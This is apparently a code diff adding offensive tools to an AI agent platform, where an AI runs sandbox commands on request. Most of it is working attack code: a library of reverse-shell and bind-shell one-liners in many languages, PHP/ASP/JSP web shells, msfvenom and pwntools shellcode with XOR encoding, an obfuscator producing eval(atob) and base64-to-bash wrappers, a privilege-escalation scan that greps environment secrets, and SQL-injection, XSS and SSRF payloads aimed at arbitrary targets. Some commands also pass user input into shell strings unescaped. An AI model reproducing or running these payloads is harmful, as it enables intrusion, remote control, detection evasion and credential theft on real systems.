@@ -647,6 +647,29 @@ export async function executeToolCall(
         return await execDecompileBinary(userId, args);
       case "fuzzer_run":
         return await execFuzzerRun(userId, args);
+      // ── New Security Tools (#51-#62) ──────────────────────────────
+      case "shellcode_gen":
+        return await execShellcodeGen(userId, args);
+      case "code_obfuscate":
+        return await execCodeObfuscate(userId, args);
+      case "privesc_check":
+        return await execPrivescCheck(userId, args);
+      case "web_attack":
+        return await execWebAttack(userId, args);
+      case "threat_intel_lookup":
+        return await execThreatIntelLookup(userId, args);
+      case "traffic_capture":
+        return await execTrafficCapture(userId, args);
+      case "ad_attack":
+        return await execAdAttack(userId, args);
+      case "cloud_enum":
+        return await execCloudEnum(userId, args);
+      case "generate_pentest_report":
+        return await execGeneratePentestReport(userId, args);
+      case "sandbox_delete_file":
+        return await execSandboxDeleteFile(userId, args);
+      case "sandbox_download_url":
+        return await execSandboxDownloadUrl(userId, args);
       default:
         return { success: false, error: `Unknown tool: ${toolName}` };
     }
@@ -4736,51 +4759,407 @@ async function execHashCrack(
   };
 }
 
+// ── GENERATE PAYLOAD — REWRITTEN (#51): Real msfvenom + pwntools execution ──
 async function execGeneratePayload(
   userId: number,
   args: Record<string, unknown>
 ): Promise<ToolExecutionResult> {
-  const payloadType = args.payloadType as string;
-  if (!payloadType) return { success: false, error: "Payload type is required" };
+  const payloadType = (args.payloadType as string) || "reverse_shell";
   const lhost = (args.lhost as string) || "10.10.14.1";
   const lport = (args.lport as number) || 4444;
   const platform = (args.platform as string) || "linux";
   const language = (args.language as string) || "python";
   const encoding = (args.encoding as string) || "none";
-  
-  const prompt = `Generate a ${payloadType} payload for authorized penetration testing.
-Platform: ${platform}
-Language: ${language}
-LHOST: ${lhost}
-LPORT: ${lport}
-Encoding: ${encoding}
+  const staged = (args.staged as boolean) || false;
+  const format = (args.format as string) || "raw";
 
-Requirements:
-- Complete, working payload code
-- Include setup instructions (listener command, how to deploy)
-- Include any required dependencies
-- If msfvenom: provide the exact msfvenom command
-- Output the payload code first, then setup instructions`;
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
 
-  const payloadContent = await invokeLLM({
-    model: "gpt-4.1-mini",
-    messages: [{ role: "user", content: prompt }],
-    priority: "background",
-  });
-  
+  // Map payload type to msfvenom payload string
+  const payloadMap: Record<string, string> = {
+    reverse_shell: platform === "windows"
+      ? (staged ? "windows/x64/meterpreter/reverse_tcp" : "windows/x64/meterpreter_reverse_tcp")
+      : (language === "python" ? "cmd/unix/reverse_python" : "cmd/unix/reverse_bash"),
+    bind_shell: platform === "windows" ? "windows/x64/shell/bind_tcp" : "cmd/unix/bind_perl",
+    web_shell: "php/meterpreter/reverse_tcp",
+    meterpreter: platform === "windows" ? "windows/x64/meterpreter/reverse_tcp" : "linux/x64/meterpreter/reverse_tcp",
+    powershell: "windows/x64/powershell_reverse_tcp",
+  };
+  const msfPayload = payloadMap[payloadType] || payloadMap["reverse_shell"];
+  const encoderFlag = encoding !== "none" ? `-e ${encoding}` : "";
+
+  // Try msfvenom first
+  const msfResult = await executeCommand(sbId, userId,
+    `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} ${encoderFlag} -f ${format} 2>&1 | head -100 || echo "MSFVENOM_UNAVAILABLE"`,
+    { timeoutMs: 60_000, triggeredBy: "ai" }
+  );
+
+  let payloadOutput = msfResult.output;
+  let generationMethod = "msfvenom";
+
+  if (msfResult.output.includes("MSFVENOM_UNAVAILABLE") || msfResult.output.includes("command not found")) {
+    generationMethod = "manual";
+    // Manual payload library covering 15+ languages
+    const manualResult = await executeCommand(sbId, userId,
+      `python3 << 'PYEOF'
+lhost = "${lhost}"
+lport = ${lport}
+language = "${language}"
+payload_type = "${payloadType}"
+
+payloads = {
+    "reverse_shell": {
+        "python":     f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",
+        "python3":    f"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/sh','-i'])",
+        "bash":       f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "bash2":      f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
+        "nc":         f"nc -e /bin/sh {lhost} {lport}",
+        "nc_mkfifo":  f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+        "perl":       f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+        "ruby":       f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "php":        f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+        "java":       f"r = Runtime.getRuntime(); p = r.exec(new String[]{{\"bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}}); p.waitFor();",
+        "go":         f'package main;import("net";"os/exec";"time");func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();time.Sleep(time.Second)}}',
+        "rust":       f'use std::net::TcpStream;use std::os::unix::io::{{AsRawFd,FromRawFd}};use std::process::{{Command,Stdio}};fn main(){{let s=TcpStream::connect("{lhost}:{lport}").unwrap();let fd=s.as_raw_fd();Command::new("/bin/sh").stdin(unsafe{{Stdio::from_raw_fd(fd)}}).stdout(unsafe{{Stdio::from_raw_fd(fd)}}).stderr(unsafe{{Stdio::from_raw_fd(fd)}}).spawn().unwrap().wait().unwrap();}}',
+        "nim":        f'import net,osproc;let s=newSocket();s.connect("{lhost}",Port({lport}));let p=startProcess("/bin/sh",options={{poUsePath}});discard p.inputStream.readAll()',
+        "lua":        f'local s=require("socket").tcp();s:connect("{lhost}",{lport});while true do local r,e=s:receive();if e then break end;local h=io.popen(r,"r");local a=h:read("*a");h:close();s:send(a) end',
+    },
+    "bind_shell": {
+        "python":  f"import socket,subprocess;s=socket.socket();s.bind(('0.0.0.0',{lport}));s.listen(1);c,a=s.accept();subprocess.call(['/bin/sh'],stdin=c,stdout=c,stderr=c)",
+        "bash":    f"bash -c 'bash -i >& /dev/tcp/0.0.0.0/{lport} 0>&1'",
+        "nc":      f"nc -lvp {lport} -e /bin/sh",
+        "perl":    f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in({lport},INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'",
+    },
+    "web_shell": {
+        "php":   "<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>",
+        "php2":  "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>",
+        "asp":   "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>",
+        "aspx":  "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>",
+        "jsp":   "<% Runtime rt = Runtime.getRuntime(); String[] commands = {\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")}; Process proc = rt.exec(commands); java.io.InputStream is = proc.getInputStream(); java.util.Scanner s = new java.util.Scanner(is).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; out.println(output); %>",
+        "python": "from flask import Flask,request;import subprocess;app=Flask(__name__);@app.route('/');def cmd():return subprocess.check_output(request.args.get('c','id'),shell=True);app.run(host='0.0.0.0',port=8080)",
+    },
+}
+
+category = payload_type if payload_type in payloads else "reverse_shell"
+lang = language if language in payloads.get(category, {}) else list(payloads.get(category, {}).keys())[0]
+result = payloads.get(category, {}).get(lang, "Unsupported combination")
+print(f"# {category} payload ({lang})")
+print(result)
+print()
+print(f"# Available languages for {category}: {list(payloads.get(category, {}).keys())}")
+PYEOF`,
+      { timeoutMs: 30_000, triggeredBy: "ai" }
+    );
+    payloadOutput = manualResult.output;
+  }
+
+  const listenerCmd = payloadType === "bind_shell"
+    ? `nc ${lhost} ${lport}`
+    : `nc -lvnp ${lport}  # or: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ${msfPayload}; set LHOST ${lhost}; set LPORT ${lport}; run"`;
+
   return {
     success: true,
     data: {
-      payloadType,
-      platform,
-      language,
-      lhost,
-      lport,
-      payload: payloadContent,
-      message: `${payloadType} payload generated for ${platform}/${language}`,
+      payloadType, platform, language, lhost, lport, encoding, staged, generationMethod,
+      payload: payloadOutput,
+      listenerCommand: listenerCmd,
+      msfvenomCommand: `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} ${encoderFlag} -f ${format}`,
+      message: `${payloadType} payload generated via ${generationMethod} for ${platform}/${language} → ${lhost}:${lport}`,
     },
   };
 }
+
+// ── SHELLCODE GENERATOR (#52) ──────────────────────────────────────────────
+async function execShellcodeGen(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const arch = (args.arch as string) || "x64";
+  const os = (args.os as string) || "linux";
+  const shellcodeType = (args.shellcodeType as string) || "reverse_shell";
+  const lhost = (args.lhost as string) || "10.10.14.1";
+  const lport = (args.lport as number) || 4444;
+  const encoder = (args.encoder as string) || "none";
+  const outputFormat = (args.outputFormat as string) || "hex";
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Install pwntools
+  await executeCommand(sbId, userId,
+    `python3 -c "import pwn" 2>/dev/null || pip3 install pwntools 2>&1 | tail -2`,
+    { timeoutMs: 60_000, triggeredBy: "ai" }
+  );
+
+  // Try msfvenom first
+  const msfPayloadMap: Record<string, Record<string, string>> = {
+    linux: { x86: "linux/x86/shell_reverse_tcp", x64: "linux/x64/shell_reverse_tcp", arm: "linux/armle/shell_reverse_tcp" },
+    windows: { x86: "windows/shell_reverse_tcp", x64: "windows/x64/shell_reverse_tcp" },
+  };
+  const msfPayload = msfPayloadMap[os]?.[arch] || "linux/x64/shell_reverse_tcp";
+  const encoderFlag = encoder !== "none" ? `-e ${encoder}` : "";
+
+  const msfResult = await executeCommand(sbId, userId,
+    `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} ${encoderFlag} -f ${outputFormat} 2>&1 | head -50 || echo "MSFVENOM_UNAVAILABLE"`,
+    { timeoutMs: 60_000, triggeredBy: "ai" }
+  );
+
+  let shellcodeOutput = msfResult.output;
+  let method = "msfvenom";
+
+  if (msfResult.output.includes("MSFVENOM_UNAVAILABLE") || msfResult.output.includes("command not found")) {
+    method = "pwntools";
+    const pwntoolsResult = await executeCommand(sbId, userId,
+      `python3 << 'PYEOF'
+try:
+    from pwn import *
+    context.arch = "${arch}"
+    context.os = "${os}"
+    if "${shellcodeType}" == "shell":
+        sc = asm(shellcraft.sh())
+    elif "${shellcodeType}" == "reverse_shell":
+        sc = asm(shellcraft.connect("${lhost}", ${lport}) + shellcraft.dupsh())
+    else:
+        sc = asm(shellcraft.sh())
+    
+    fmt = "${outputFormat}"
+    if fmt == "hex":
+        print(sc.hex())
+    elif fmt == "c":
+        print("unsigned char shellcode[] = {" + ",".join(hex(b) for b in sc) + "};")
+        print(f"unsigned int shellcode_len = {len(sc)};")
+    elif fmt == "python":
+        print("shellcode = b'" + "".join(f"\\\\x{b:02x}" for b in sc) + "'")
+    elif fmt == "base64":
+        import base64
+        print(base64.b64encode(sc).decode())
+    else:
+        print(sc.hex())
+    print(f"# Length: {len(sc)} bytes, arch: ${arch}/${os}")
+except Exception as e:
+    print(f"pwntools error: {e}")
+    # Fallback: classic x64 Linux execve /bin/sh shellcode
+    sc = bytes([0x48,0x31,0xd2,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x48,0xc1,0xeb,0x08,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05])
+    print("# Fallback: x64 Linux execve /bin/sh (30 bytes)")
+    print("\\\\x" + "\\\\x".join(f"{b:02x}" for b in sc))
+PYEOF`,
+      { timeoutMs: 30_000, triggeredBy: "ai" }
+    );
+    shellcodeOutput = pwntoolsResult.output;
+  }
+
+  // Apply XOR encoding if requested
+  if (encoder === "xor" && !msfResult.output.includes("MSFVENOM_UNAVAILABLE")) {
+    const xorResult = await executeCommand(sbId, userId,
+      `python3 -c "
+raw_hex = '${shellcodeOutput.replace(/[^0-9a-fA-F]/g, '').substring(0, 2000)}'
+if raw_hex:
+    raw = bytes.fromhex(raw_hex)
+    key = 0xAA
+    encoded = bytes(b ^ key for b in raw)
+    print(f'XOR key: 0x{key:02x}')
+    print(f'Encoded ({len(encoded)} bytes): ' + encoded.hex())
+    print('Decoder stub:')
+    print(f'  key = 0x{key:02x}')
+    print(f'  shellcode = bytes(b ^ key for b in bytes.fromhex(\"{encoded.hex()}\"))')
+else:
+    print('Could not apply XOR: no hex shellcode found')
+" 2>&1`,
+      { timeoutMs: 10_000, triggeredBy: "ai" }
+    );
+    shellcodeOutput += "\n\n" + xorResult.output;
+  }
+
+  return {
+    success: true,
+    data: {
+      arch, os, shellcodeType, lhost, lport, encoder, outputFormat, method,
+      shellcode: shellcodeOutput,
+      message: `${arch}/${os} shellcode generated via ${method} (${outputFormat}${encoder !== "none" ? ", " + encoder + " encoded" : ""})`,
+    },
+  };
+}
+
+// ── CODE OBFUSCATOR (#53) ──────────────────────────────────────────────────
+async function execCodeObfuscate(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const code = args.code as string;
+  const language = (args.language as string) || "python";
+  const level = (args.level as string) || "medium";
+
+  if (!code) return { success: false, error: "Code is required" };
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Write code to temp file
+  const escapedCode = code.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+  await executeCommand(sbId, userId,
+    `printf '%s' '${escapedCode}' > /tmp/obf_input_src`,
+    { timeoutMs: 5_000, triggeredBy: "ai" }
+  );
+
+  let obfuscatedCode = "";
+  let method = "";
+
+  if (language === "python") {
+    method = "base64+zlib (PyArmor fallback)";
+    await executeCommand(sbId, userId,
+      `pip3 install pyarmor 2>&1 | tail -1`,
+      { timeoutMs: 60_000, triggeredBy: "ai" }
+    );
+    const pyarmorResult = await executeCommand(sbId, userId,
+      `cp /tmp/obf_input_src /tmp/obf_input.py && cd /tmp && pyarmor gen obf_input.py 2>&1 && cat /tmp/dist/obf_input.py 2>/dev/null || echo "PYARMOR_FAILED"`,
+      { timeoutMs: 30_000, triggeredBy: "ai" }
+    );
+    if (!pyarmorResult.output.includes("PYARMOR_FAILED")) {
+      obfuscatedCode = pyarmorResult.output;
+      method = "PyArmor";
+    } else {
+      const manualResult = await executeCommand(sbId, userId,
+        `python3 -c "
+import base64, zlib
+code = open('/tmp/obf_input_src').read()
+compressed = zlib.compress(code.encode())
+encoded = base64.b64encode(compressed).decode()
+print('import base64,zlib')
+print(f'exec(zlib.decompress(base64.b64decode(\"{encoded}\")))')
+" 2>&1`,
+        { timeoutMs: 10_000, triggeredBy: "ai" }
+      );
+      obfuscatedCode = manualResult.output;
+    }
+  } else if (language === "powershell") {
+    method = "Base64 + char array";
+    const psResult = await executeCommand(sbId, userId,
+      `python3 -c "
+import base64
+code = open('/tmp/obf_input_src').read()
+encoded = base64.b64encode(code.encode('utf-16-le')).decode()
+print(f'powershell -EncodedCommand {encoded}')
+print()
+print('# Char array variant:')
+chars = ','.join(str(ord(c)) for c in code[:500])
+print(f'IEX([char[]]({chars}) -join \\'\\'')")
+" 2>&1`,
+      { timeoutMs: 10_000, triggeredBy: "ai" }
+    );
+    obfuscatedCode = psResult.output;
+  } else if (language === "javascript" || language === "js") {
+    method = "atob/eval + hex encoding";
+    const jsResult = await executeCommand(sbId, userId,
+      `python3 -c "
+import base64
+code = open('/tmp/obf_input_src').read()
+encoded = base64.b64encode(code.encode()).decode()
+print(f'eval(atob(\"{encoded}\"))')
+print()
+print('// Hex variant:')
+hex_str = ''.join(f'\\\\x{ord(c):02x}' for c in code[:300])
+print(f'eval(\"{hex_str}...\")')
+" 2>&1`,
+      { timeoutMs: 10_000, triggeredBy: "ai" }
+    );
+    obfuscatedCode = jsResult.output;
+  } else if (language === "bash") {
+    method = "base64 pipe";
+    const bashResult = await executeCommand(sbId, userId,
+      `python3 -c "
+import base64
+code = open('/tmp/obf_input_src').read()
+encoded = base64.b64encode(code.encode()).decode()
+print(f'echo {encoded}|base64 -d|bash')
+print()
+print('# Hex variant:')
+hex_str = ''.join(f'\\\\x{ord(c):02x}' for c in code[:200])
+print(f'echo -e \"{hex_str}\"|bash')
+" 2>&1`,
+      { timeoutMs: 10_000, triggeredBy: "ai" }
+    );
+    obfuscatedCode = bashResult.output;
+  } else {
+    obfuscatedCode = `Language '${language}' not supported. Supported: python, powershell, javascript, bash`;
+  }
+
+  return {
+    success: true,
+    data: {
+      language, level, method,
+      originalLength: code.length,
+      obfuscatedCode,
+      message: `Code obfuscated (${language}, ${method})`,
+    },
+  };
+}
+
+// ── PRIVILEGE ESCALATION CHECKER (#54) ────────────────────────────────────
+async function execPrivescCheck(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const targetOs = (args.targetOs as string) || "linux";
+  const depth = (args.depth as string) || "standard";
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  let findings = "";
+  let method = "";
+
+  if (targetOs === "linux") {
+    method = "LinPEAS + manual checks";
+    // Try LinPEAS, fall back to manual
+    const linpeasResult = await executeCommand(sbId, userId,
+      `curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | head -300 || echo "LINPEAS_UNAVAILABLE"`,
+      { timeoutMs: 90_000, triggeredBy: "ai" }
+    );
+
+    if (linpeasResult.output.includes("LINPEAS_UNAVAILABLE") || linpeasResult.output.length < 200) {
+      method = "manual checks";
+      const manualResult = await executeCommand(sbId, userId,
+        `echo "=== SUID BINARIES ===" && find / -perm -4000 -type f 2>/dev/null | head -20 && echo "=== SUDO ===" && sudo -l 2>&1 && echo "=== CAPABILITIES ===" && getcap -r / 2>/dev/null && echo "=== WRITABLE CRON ===" && ls -la /etc/cron* 2>/dev/null && echo "=== KERNEL ===" && uname -a && echo "=== DOCKER GROUP ===" && id && echo "=== ENV SECRETS ===" && env | grep -iE "pass|key|secret|token" 2>/dev/null | head -10`,
+        { timeoutMs: 60_000, triggeredBy: "ai" }
+      );
+      findings = manualResult.output;
+    } else {
+      findings = linpeasResult.output.substring(0, 5000);
+    }
+  } else {
+    method = "WinPEAS checklist";
+    findings = `Windows Privilege Escalation Checklist:
+
+1. AlwaysInstallElevated:
+   reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+   reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+
+2. Token privileges (look for SeImpersonatePrivilege → Potato attacks):
+   whoami /priv
+
+3. Unquoted service paths:
+   wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\"
+
+4. Stored credentials:
+   cmdkey /list
+
+5. UAC bypass check:
+   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA
+
+6. Scheduled tasks with weak permissions:
+   schtasks /query /fo LIST /v | findstr /i "task name\\|run as\\|status"
+
+Download WinPEAS: https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
+Run: winPEASany.exe quiet`;
+  }
+
+  return {
+    success: true,
+    data: {
+      targetOs, depth, method, findings,
+      message: `Privilege escalation check complete for ${targetOs} (${method})`,
+    },
+  };
+}
+
 
 async function execOsintLookup(
   userId: number,
@@ -5078,6 +5457,750 @@ async function execFuzzerRun(
       wordlist: wlPath,
       output: result.output,
       durationMs: result.durationMs,
+    },
+  };
+}
+
+// ── WEB ATTACK TOOL (#55) ─────────────────────────────────────────────────
+async function execWebAttack(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const target = args.target as string;
+  const attackType = (args.attackType as string) || "scan";
+  const options = (args.options as string) || "";
+
+  if (!target) return { success: false, error: "Target URL is required" };
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Install tools
+  await executeCommand(sbId, userId,
+    `which nikto 2>/dev/null || apt-get install -y nikto -qq 2>/dev/null; which sqlmap 2>/dev/null || pip3 install sqlmap 2>/dev/null; which xsstrike 2>/dev/null || pip3 install xsstrike 2>/dev/null; echo "tools_ready"`,
+    { timeoutMs: 120_000, triggeredBy: "ai" }
+  );
+
+  let cmd = "";
+  let toolUsed = "";
+
+  if (attackType === "nikto" || attackType === "scan") {
+    toolUsed = "nikto";
+    cmd = `nikto -h "${target}" ${options} -maxtime 60 2>&1 | head -100 || echo "nikto not available, running basic curl check" && curl -sI "${target}" 2>&1 | head -30`;
+  } else if (attackType === "sqli" || attackType === "sqlmap") {
+    toolUsed = "sqlmap";
+    cmd = `sqlmap -u "${target}" --batch --level=2 --risk=1 ${options} 2>&1 | head -100`;
+  } else if (attackType === "xss") {
+    toolUsed = "XSStrike";
+    cmd = `python3 -m xsstrike -u "${target}" ${options} 2>&1 | head -80 || python3 -c "
+import requests, urllib.parse
+target = '${target}'
+payloads = [
+    '<script>alert(1)</script>',
+    '\\\"><script>alert(1)</script>',
+    \"'><img src=x onerror=alert(1)>\",
+    '<svg onload=alert(1)>',
+    'javascript:alert(1)',
+    '\\\"onmouseover=\\\"alert(1)',
+]
+print(f'Testing XSS on: {target}')
+for p in payloads:
+    try:
+        r = requests.get(target, params={'q': p, 'search': p, 'id': p}, timeout=5, verify=False)
+        if p in r.text:
+            print(f'POTENTIAL XSS: {p}')
+        else:
+            print(f'Not reflected: {p[:30]}...')
+    except Exception as e:
+        print(f'Error: {e}')
+" 2>&1`;
+  } else if (attackType === "ssrf") {
+    toolUsed = "SSRF scanner";
+    cmd = `python3 -c "
+import requests, urllib.parse
+target = '${target}'
+ssrf_payloads = [
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.169.254/metadata/v1/',
+    'http://metadata.google.internal/',
+    'http://localhost:80/',
+    'http://127.0.0.1:22/',
+    'http://0.0.0.0:6379/',
+    'file:///etc/passwd',
+    'dict://localhost:6379/info',
+]
+params_to_test = ['url', 'redirect', 'next', 'path', 'dest', 'uri', 'target', 'src', 'source', 'fetch', 'load']
+print(f'Testing SSRF on: {target}')
+for param in params_to_test:
+    for payload in ssrf_payloads[:3]:
+        try:
+            r = requests.get(target, params={param: payload}, timeout=5, verify=False, allow_redirects=False)
+            if r.status_code in [200, 301, 302] and len(r.text) > 100:
+                print(f'POTENTIAL SSRF: param={param}, payload={payload}, status={r.status_code}, len={len(r.text)}')
+        except: pass
+print('SSRF scan complete')
+" 2>&1`;
+  } else if (attackType === "headers") {
+    toolUsed = "security headers check";
+    cmd = `python3 -c "
+import requests
+r = requests.get('${target}', timeout=10, verify=False)
+headers = r.headers
+security_headers = {
+    'Strict-Transport-Security': 'HSTS',
+    'Content-Security-Policy': 'CSP',
+    'X-Frame-Options': 'Clickjacking protection',
+    'X-Content-Type-Options': 'MIME sniffing protection',
+    'X-XSS-Protection': 'XSS filter',
+    'Referrer-Policy': 'Referrer policy',
+    'Permissions-Policy': 'Permissions policy',
+}
+print(f'Security Headers Analysis: ${target}')
+print(f'Status: {r.status_code}')
+print()
+for header, desc in security_headers.items():
+    val = headers.get(header, 'MISSING')
+    status = 'PRESENT' if val != 'MISSING' else 'MISSING'
+    print(f'  {status}: {header} ({desc}) = {val[:80]}')
+print()
+print('Server:', headers.get('Server', 'hidden'))
+print('X-Powered-By:', headers.get('X-Powered-By', 'hidden'))
+" 2>&1`;
+  } else {
+    cmd = `echo "Unknown attack type: ${attackType}. Supported: scan, nikto, sqli, xss, ssrf, headers"`;
+    toolUsed = "none";
+  }
+
+  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 120_000, triggeredBy: "ai" });
+
+  return {
+    success: true,
+    data: {
+      target, attackType, toolUsed,
+      output: result.output,
+      message: `Web attack (${attackType}) complete against ${target} using ${toolUsed}`,
+    },
+  };
+}
+
+// ── THREAT INTEL LOOKUP (#56) ─────────────────────────────────────────────
+async function execThreatIntelLookup(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const ioc = args.ioc as string;
+  const iocType = (args.iocType as string) || "auto";
+
+  if (!ioc) return { success: false, error: "IOC (IP, domain, hash, or URL) is required" };
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Auto-detect IOC type
+  const detectCmd = `python3 -c "
+import re
+ioc = '${ioc.replace(/'/g, "\\'")}'
+if re.match(r'^[0-9a-fA-F]{32}$', ioc): print('md5')
+elif re.match(r'^[0-9a-fA-F]{40}$', ioc): print('sha1')
+elif re.match(r'^[0-9a-fA-F]{64}$', ioc): print('sha256')
+elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ioc): print('ip')
+elif ioc.startswith('http'): print('url')
+else: print('domain')
+" 2>&1`;
+  const detectResult = await executeCommand(sbId, userId, detectCmd, { timeoutMs: 5_000, triggeredBy: "ai" });
+  const detectedType = iocType === "auto" ? detectResult.output.trim() : iocType;
+
+  const results: Record<string, string> = {};
+
+  // VirusTotal (free API - no key needed for basic lookups via web)
+  const vtResult = await executeCommand(sbId, userId,
+    `python3 -c "
+import urllib.request, json, os
+ioc = '${ioc.replace(/'/g, "\\'")}'
+ioc_type = '${detectedType}'
+vt_key = os.environ.get('VIRUSTOTAL_API_KEY', '')
+
+if vt_key:
+    endpoints = {
+        'ip': f'https://www.virustotal.com/api/v3/ip_addresses/{ioc}',
+        'domain': f'https://www.virustotal.com/api/v3/domains/{ioc}',
+        'md5': f'https://www.virustotal.com/api/v3/files/{ioc}',
+        'sha1': f'https://www.virustotal.com/api/v3/files/{ioc}',
+        'sha256': f'https://www.virustotal.com/api/v3/files/{ioc}',
+        'url': f'https://www.virustotal.com/api/v3/urls/{ioc}',
+    }
+    url = endpoints.get(ioc_type, endpoints['domain'])
+    req = urllib.request.Request(url, headers={'x-apikey': vt_key})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            data = json.loads(r.read())
+            stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
+            malicious = stats.get('malicious', 0)
+            total = sum(stats.values())
+            print(f'VirusTotal: {malicious}/{total} engines flagged as malicious')
+            print(f'Verdict: {\"MALICIOUS\" if malicious > 3 else \"CLEAN\"}')
+    except Exception as e:
+        print(f'VirusTotal error: {e}')
+else:
+    print('VirusTotal: No API key (set VIRUSTOTAL_API_KEY env var)')
+    print(f'Manual check: https://www.virustotal.com/gui/search/{ioc}')
+" 2>&1`,
+    { timeoutMs: 15_000, triggeredBy: "ai" }
+  );
+  results.virustotal = vtResult.output;
+
+  // AbuseIPDB (for IPs)
+  if (detectedType === "ip") {
+    const abuseResult = await executeCommand(sbId, userId,
+      `python3 -c "
+import urllib.request, json, os
+ip = '${ioc.replace(/'/g, "\\'")}'
+key = os.environ.get('ABUSEIPDB_API_KEY', '')
+if key:
+    url = f'https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90'
+    req = urllib.request.Request(url, headers={'Key': key, 'Accept': 'application/json'})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            data = json.loads(r.read())['data']
+            print(f'AbuseIPDB: Score={data[\"abuseConfidenceScore\"]}%, Reports={data[\"totalReports\"]}, Country={data[\"countryCode\"]}, ISP={data[\"isp\"]}')
+            print(f'Verdict: {\"MALICIOUS\" if data[\"abuseConfidenceScore\"] > 50 else \"CLEAN\"}')
+    except Exception as e:
+        print(f'AbuseIPDB error: {e}')
+else:
+    print('AbuseIPDB: No API key (set ABUSEIPDB_API_KEY env var)')
+    print(f'Manual check: https://www.abuseipdb.com/check/{ip}')
+" 2>&1`,
+      { timeoutMs: 15_000, triggeredBy: "ai" }
+    );
+    results.abuseipdb = abuseResult.output;
